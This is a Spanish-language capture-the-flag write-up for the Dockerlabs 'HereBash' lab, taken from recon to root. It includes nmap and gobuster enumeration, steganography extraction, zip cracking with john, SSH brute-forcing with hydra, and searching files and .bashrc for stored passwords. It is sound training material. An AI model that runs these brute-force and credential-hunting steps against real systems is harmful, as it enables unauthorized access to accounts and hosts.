
# Writeup Template: Maquina `[ HereBash ]`

- Tags: #Herebash
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina HereBash](https://mega.nz/file/tDFTjZ4Z#bkqPWRqK__cqqz0cn_rFz6Q4hamYS4w48S2RCEXcs2A)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x herebash.zip
sudo bash auto_deploy.sh herebash.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 6.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/scripts/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/scripts/             (Status: 200) [Size: 1130]
/spongebob/           (Status: 200) [Size: 1341]
/revolt/              (Status: 200) [Size: 739]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,pl
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 10733]
/scripts              (Status: 301) [Size: 310] [--> http://172.17.0.2/scripts/]
/spongebob            (Status: 301) [Size: 312] [--> http://172.17.0.2/spongebob/]
/revolt               (Status: 301) [Size: 309] [--> http://172.17.0.2/revolt/]
```

Tenemos esta url que cuando ingresamos a ella nos retorna un: **Metodo no permitido** asi que probaremos cambiando los metodos:
```bash
http://172.17.0.2/scripts/put.php

curl -s -X GET http://172.17.0.2/scripts/put.php
curl -s -X POST http://172.17.0.2/scripts/put.php
```

Con en metodo **PUT** cambia la respuesta, Retornando lo que paraceria ser un usuario valido:
```bash
curl -s -X PUT http://172.17.0.2/scripts/put.php

spongebob # Posible usuario o contrasena
```

Tenemos esta otra ruta que almacena una imagen:
```bash
http://172.17.0.2/spongebob/spongebob.html
```

Pero revisando el codigo fuente tenemos este comentario que posbilenete sea **hostDiscovery**:
```bash
<!-- http://codepen.io/rachel_web/pen/aOeJJq -->
```

En esta ruta tenemos una imagen que nos descargaremos para aplicar **Esteganografia**:
```bash
http://172.17.0.2/spongebob/upload/ohnorecallwin.jpg
```

Ahora que descargamos la imagen procedemos a realizar el analizis:
```bash
file ohnorecallwin.jpg # Verificamos que sea realmente una imagen
strings ohnorecallwin.jpg # Buscamos posibles cadenas legibles
binwalk ohnorecallwin.jpg # Verificamos si existen archivos ocultos
```

Con este funciona ya que obtenemos los datos ocultos:
```bash
stegseek ohnorecallwin.jpg
```

Resultado:
```bash
[i] Found passphrase: "spongebob"
[i] Original filename: "seguro.zip".
[i] Extracting to "ohnorecallwin.jpg.out".
```

Ahora procedemos a extraer el archivo y para la clave de salvoconducto: **spongebob**:
```bash
steghide extract -sf ohnorecallwin.jpg
```

Si nos intentamos descromprimir nos pide una contrasena:
```bash
7z x seguro.zip

Enter password (will not be echoed):
ERROR: Wrong password : secreto.txt
```

Vemos que tiene un archivo: **secreto.txt** asi que ese ahora es nuestro objetivo, Por lo que primero convertimos el **hash**
```bash
zip2john seguro.zip > hash.txt
```

Ahora realizamos ataque de fuerza bruta para encontrar la clave:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Tenemos la clave:
```bash
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate        (seguro.zip/secreto.txt)
```

### Credenciales Encontradas
Volvemos a descomprimir y vemos el contenido que parese una contrasena:
```bash
cat secreto.txt
─────┬──────────────────
     │ File: secreto.txt
─────┼──────────────────
 1   │ aprendemos
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemnos una posible credencial la usaremos para intentar descubrir un usaurio valido para el sistema:
### Ejecucion del Ataque
```bash
# Comandos para explotación
hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p aprendemos -f ssh://172.17.0.2
```

### Intrusion
Tenemos una credencial valida:
```bash
[22][ssh] host: 172.17.0.2   login: rosa   password: aprendemos
```

```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh rosa@172.17.0.2 # ( aprendemos )
``` 

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
-
```
### Explotacion de Privilegios

###### Usuario `[ rosa ]`:
Tenemo un directorio bajo el nombre **-** pero como sabemos que eso significa una flag para un comando la manera de acceder es la siguiente:
```bash
cd ./-
```

Ahora tenemos muchas carpteas:
```bash
buscaelpass1   buscaelpass13  buscaelpass17  buscaelpass20  buscaelpass24  buscaelpass28  buscaelpass31  buscaelpass35  buscaelpass39  buscaelpass42  buscaelpass46  buscaelpass5   buscaelpass53  buscaelpass57  buscaelpass60  buscaelpass64  buscaelpass7
buscaelpass10  buscaelpass14  buscaelpass18  buscaelpass21  buscaelpass25  buscaelpass29  buscaelpass32  buscaelpass36  buscaelpass4   buscaelpass43  buscaelpass47  buscaelpass50  buscaelpass54  buscaelpass58  buscaelpass61  buscaelpass65  buscaelpass8
buscaelpass11  buscaelpass15  buscaelpass19  buscaelpass22  buscaelpass26  buscaelpass3   buscaelpass33  buscaelpass37  buscaelpass40  buscaelpass44  buscaelpass48  buscaelpass51  buscaelpass55  buscaelpass59  buscaelpass62  buscaelpass66  buscaelpass9
buscaelpass12  buscaelpass16  buscaelpass2   buscaelpass23  buscaelpass27  buscaelpass30  buscaelpass34  buscaelpass38  buscaelpass41  buscaelpass45  buscaelpass49  buscaelpass52  buscaelpass56  buscaelpass6   buscaelpass63  buscaelpass67  creararch.sh
```

Tenemos un archivo: **creararch.sh** que si revisamos su conteniod tenemos lo siguiente:
```bash
#!/bin/bash

# Buscamos directorios que empiezan con "busca"
for directorio in busca*; do
        # Comprobamos si el directorio existe
        if [ -d "$directorio" ]; then
                for i in {1..50}; do
                        touch "$directorio/archivo$i" && echo "xxxxxx:xxxxxx" >$directorio/archivo$i
                done
                echo "Se crearon 50 archivos en $directorio"
        else
                echo "El directorio $directorio no existe"
        fi
done
```

Ahora sabemos que la posible contrasena empieza por **x**, Usaremos el comando **find** para iniciar la busqueda
```bash
find ./- -type f -exec cat {} \; | grep -v x$
```

Resultado:
```bash
pedro:ell0c0
```

Migramos de usuario:
```bash
# Comando para escalar al usuario: ( pedro )
su pedro # ( ell0c0 )
```

###### Usuario `[ pedro ]`:
Para este usuario buscamos por sus archivos ocultos:
```bash
find / -iname ".*" -user pedro 2>/dev/null
```

Tenemos el siguiente resultado:
```bash
/home/pedro/.../.misecreto
```

Ahora revisamos el contenido:
```bash
cat /home/pedro/.../.misecreto
Consegui el pass de juan y lo tengo escondido en algun lugar del sistema fuera de mi home.
```

El objetivo ahora es encontrar ese archivo:
```bash
find / -type f -user pedro 2>/dev/null
```

El archivo se encuentra en la siguiente ruta:
```bash
/var/mail/.pass_juan
```

Ahora revisaremos su contenido:
```bash
cat /var/mail/.pass_juan
```

Tenemos lo siguiente que parece una contrasena en **base64**:
```bash
ZWxwcmVzaW9uZXMK
```

Revertimos el proceso:
```bash
echo "ZWxwcmVzaW9uZXMK" | base64 -d
elpresiones # contrasena
```

Despues de intentar loguearnos, Determinamos que la contrasena tiene que esta en **base64** para que funciones
```bash
su juan # ( ZWxwcmVzaW9uZXMK )
```

###### Usuario `[ juan ]`:
Tenemos lo siguiete para el usaurio **juan**
```bash
cat .ordenes_nuevas 
Hola soy tu patron y me canse y me fui a casa te dejo mi pass en un lugar a mano consiguelo y acaba el trabajo.
```

Revisando el archivo de configuracion de **bash** tenemos lo siguiente:
```bash
cat .bashrc

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias pass='eljefe'
alias l='ls -CF'
```

Tenemos la contrasena: asi que la probaremos con **root**
```bash
su root # ( eljefe )
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@d2069c1d18a6:/home/juan# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a realizar **estaganografia**
2. Aprendimos a realizar fuerza bruta para obtener archivos ocultos en imagenes
3. Aprendimos a usar el comando **find** para encontrar archivos con credenciales de usuarios en el sistema

## Recomendaciones de Seguridad
- No almacenar credenciales de usuario en archivos del sistema.